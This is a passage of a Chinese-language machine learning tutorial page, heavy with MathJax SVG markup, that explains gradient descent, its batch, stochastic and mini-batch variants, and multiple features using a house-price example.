3;"/></g><g data-mml-node="TeXAtom" transform="translate(523,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(389,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(734,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><msup><mi>y</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msup></math></mjx-assistive-mml></mjx-container>：第<mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="0.781ex" height="1.52ex" role="img" focusable="false" viewbox="0 -661 345 672" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>i</mi></math></mjx-assistive-mml></mjx-container>个样本的真实值</li></ul><h2 id="梯度下降-Gradient-Descent">梯度下降(Gradient Descent)</h2><p>梯度下降（Gradient Descent）是一种<strong>优化算法</strong>，用于<strong>最小化损失函数</strong>，在机器学习和深度学习中广泛应用。</p><p>核心思想：<strong>沿着损失函数梯度下降的方向，逐步更新参数，使损失函数的值最小化</strong>。</p><h3 id="原理">原理</h3><ul><li>计算损失函数的梯度</li></ul><p>通过对损失函数<mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="4.253ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 1880 1000" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43D" d="M447 625Q447 637 354 637H329Q323 642 323 645T325 664Q329 677 335 683H352Q393 681 498 681Q541 681 568 681T605 682T619 682Q633 682 633 672Q633 670 630 658Q626 642 623 640T604 637Q552 637 545 623Q541 610 483 376Q420 128 419 127Q397 64 333 21T195 -22Q137 -22 97 8T57 88Q57 130 80 152T132 174Q177 174 182 130Q182 98 164 80T123 56Q115 54 115 53T122 44Q148 15 197 15Q235 15 271 47T324 130Q328 142 387 380T447 625Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(633,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(1022,0)"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(1491,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>J</mi><mo stretchy="false">(</mo><mi>θ</mi><mo stretchy="false">)</mo></math></mjx-assistive-mml></mjx-container>计算偏导，得到参数<mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.023ex;" xmlns="http://www.w3.org/2000/svg" width="1.061ex" height="1.618ex" role="img" focusable="false" viewbox="0 -705 469 715" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>θ</mi></math></mjx-assistive-mml></mjx-container>对应的梯度<mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="6.138ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 2713 1000" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="394" d="M51 0Q46 4 46 7Q46 9 215 357T388 709Q391 716 416 716Q439 716 444 709Q447 705 616 357T786 7Q786 4 781 0H51ZM507 344L384 596L137 92L383 91H630Q630 93 507 344Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(833,0)"><path data-c="1D43D" d="M447 625Q447 637 354 637H329Q323 642 323 645T325 664Q329 677 335 683H352Q393 681 498 681Q541 681 568 681T605 682T619 682Q633 682 633 672Q633 670 630 658Q626 642 623 640T604 637Q552 637 545 623Q541 610 483 376Q420 128 419 127Q397 64 333 21T195 -22Q137 -22 97 8T57 88Q57 130 80 152T132 174Q177 174 182 130Q182 98 164 80T123 56Q115 54 115 53T122 44Q148 15 197 15Q235 15 271 47T324 130Q328 142 387 380T447 625Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(1466,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(1855,0)"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(2324,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi mathvariant="normal">Δ</mi><mi>J</mi><mo stretchy="false">(</mo><mi>θ</mi><mo stretchy="false">)</mo></math></mjx-assistive-mml></mjx-container>。</p><ul><li>更新参数</li></ul><p>使用学习率<mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.448ex" height="1.025ex" role="img" focusable="false" viewbox="0 -442 640 453" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D6FC" d="M34 156Q34 270 120 356T309 442Q379 442 421 402T478 304Q484 275 485 237V208Q534 282 560 374Q564 388 566 390T582 393Q603 393 603 385Q603 376 594 346T558 261T497 161L486 147L487 123Q489 67 495 47T514 26Q528 28 540 37T557 60Q559 67 562 68T577 70Q597 70 597 62Q597 56 591 43Q579 19 556 5T512 -10H505Q438 -10 414 62L411 69L400 61Q390 53 370 41T325 18T267 -2T203 -11Q124 -11 79 39T34 156ZM208 26Q257 26 306 47T379 90L403 112Q401 255 396 290Q382 405 304 405Q235 405 183 332Q156 292 139 224T121 120Q121 71 146 49T208 26Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>α</mi></math></mjx-assistive-mml></mjx-container>（Learning Rate）（步长）沿梯度的方向更新参数</p><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="15.491ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 6847 1000" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(746.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(1802.6,0)"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(2493.8,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(3494,0)"><path data-c="1D6FC" d="M34 156Q34 270 120 356T309 442Q379 442 421 402T478 304Q484 275 485 237V208Q534 282 560 374Q564 388 566 390T582 393Q603 393 603 385Q603 376 594 346T558 261T497 161L486 147L487 123Q489 67 495 47T514 26Q528 28 540 37T557 60Q559 67 562 68T577 70Q597 70 597 62Q597 56 591 43Q579 19 556 5T512 -10H505Q438 -10 414 62L411 69L400 61Q390 53 370 41T325 18T267 -2T203 -11Q124 -11 79 39T34 156ZM208 26Q257 26 306 47T379 90L403 112Q401 255 396 290Q382 405 304 405Q235 405 183 332Q156 292 139 224T121 120Q121 71 146 49T208 26Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(4134,0)"><path data-c="394" d="M51 0Q46 4 46 7Q46 9 215 357T388 709Q391 716 416 716Q439 716 444 709Q447 705 616 357T786 7Q786 4 781 0H51ZM507 344L384 596L137 92L383 91H630Q630 93 507 344Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(4967,0)"><path data-c="1D43D" d="M447 625Q447 637 354 637H329Q323 642 323 645T325 664Q329 677 335 683H352Q393 681 498 681Q541 681 568 681T605 682T619 682Q633 682 633 672Q633 670 630 658Q626 642 623 640T604 637Q552 637 545 623Q541 610 483 376Q420 128 419 127Q397 64 333 21T195 -22Q137 -22 97 8T57 88Q57 130 80 152T132 174Q177 174 182 130Q182 98 164 80T123 56Q115 54 115 53T122 44Q148 15 197 15Q235 15 271 47T324 130Q328 142 387 380T447 625Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(5600,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(5989,0)"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(6458,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mi>θ</mi><mo>=</mo><mi>θ</mi><mo>−</mo><mi>α</mi><mi mathvariant="normal">Δ</mi><mi>J</mi><mo stretchy="false">(</mo><mi>θ</mi><mo stretchy="false">)</mo></math></mjx-assistive-mml></mjx-container><p>这里，<mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="6.138ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 2713 1000" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="394" d="M51 0Q46 4 46 7Q46 9 215 357T388 709Q391 716 416 716Q439 716 444 709Q447 705 616 357T786 7Q786 4 781 0H51ZM507 344L384 596L137 92L383 91H630Q630 93 507 344Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(833,0)"><path data-c="1D43D" d="M447 625Q447 637 354 637H329Q323 642 323 645T325 664Q329 677 335 683H352Q393 681 498 681Q541 681 568 681T605 682T619 682Q633 682 633 672Q633 670 630 658Q626 642 623 640T604 637Q552 637 545 623Q541 610 483 376Q420 128 419 127Q397 64 333 21T195 -22Q137 -22 97 8T57 88Q57 130 80 152T132 174Q177 174 182 130Q182 98 164 80T123 56Q115 54 115 53T122 44Q148 15 197 15Q235 15 271 47T324 130Q328 142 387 380T447 625Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(1466,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(1855,0)"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(2324,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi mathvariant="normal">Δ</mi><mi>J</mi><mo stretchy="false">(</mo><mi>θ</mi><mo stretchy="false">)</mo></math></mjx-assistive-mml></mjx-container>指示了损失函数上升最快的方向，负号表示向下降的方向移动。</p><ul><li>重复迭代，直至收敛</li></ul><p>持续更新参数，知道损失函数的变化足够小（或者达到预设的迭代次数）。</p><h3 id="梯度下降的三种类型">梯度下降的三种类型</h3><ol><li><p><strong>批量梯度下降（BGD, Batch Gradient Descent）</strong></p><ul><li><p>计算整个训练集上的梯度，求均值后更新参数。</p></li><li><p><strong>优点</strong>：收敛稳定</p></li><li><p><strong>缺点</strong>：计算量大，不适合大规模数据</p></li></ul></li><li><p><strong>随机梯度下降（SGD, Stochastic Gradient Descent）</strong></p><ul><li>每次仅使用<strong>一个样本</strong>来更新参数，更新更快。</li><li><strong>优点</strong>：计算快，适合大规模数据</li><li><strong>缺点</strong>：更新不稳定，可能震荡不收敛</li></ul></li><li><p><strong>小批量梯度下降（MBGD, Mini-batch Gradient Descent）</strong></p><ul><li>介于批量和随机之间，每次使用一个小批量数据（如 32、64 个样本）计算梯度。</li><li><strong>优点</strong>：计算稳定，收敛快，适合大数据</li></ul></li></ol><h2 id="多特征-Multiple-Features">多特征(Multiple Features)</h2><p><strong>多特征</strong>，在机器学习里，指的是每个样本（数据点）有<strong>多个属性或变量</strong>来描述它。</p><p>比如，你想训练一个模型预测房价：</p><ul><li>一个房子可以有很多特征（Feature），比如：面积、楼层、建造年份、距离地铁的距离、装修情况等等。</li><li>每一个特征就是一个影响预测结果的因素。</li><li>这些特征加在一起，就叫<strong>多特征</strong>（multi-feature）。</li></ul><p>简单理解就是：</p><blockquote><p>一个样本不只用一个数字描述，而是用一组数字或属性来描述。</p></blockquote><p>在数学上，一般用一个向量来表示，比如：</p><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="54.213ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 23962.2 1000" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(849.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(1905.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(2294.6,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)" style="stroke-width: 3;"/><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(1000,0)" style="stroke-width: 3;"/></g><g data-mml-node="mtext" transform="translate(3794.6,0)"><path data-c="A0" d="" style="stroke-width: 3;"/></g><g data-mml-node="mtext" transform="translate(4044.6,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">平</text><text data-variant="normal" transform="translate(1000,0) scale(1,-1)" font-size="884px" font-family="serif">方</text><text data-variant="normal" transform="translate(2000,0) scale(1,-1)" font-size="884px" font-family="serif">米</text></g><g data-mml-node="mo" transform="translate(7044.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z" style="stroke-width: 3;"/></g><g data-mml-node="mtext" transform="translate(7489.2,0)"><path data-c="A0" d="" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(7739.2,0)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" style="stroke-width: 3;"/></g><g data-mml-node="mtext" transform="translate(8239.2,0)"><path data-c="A0" d="" style="stroke-width: 3;"/></g><g data-mml-node="mtext" transform="translate(8489.2,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">楼</text></g><g data-mml-node="mo" transform="translate(9489.2,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z" style="stroke-width: 3;"/></g><g data-mml-node="mtext" transform="translate(9933.9,0)"><path data-c="A0" d="" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(10183.9,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 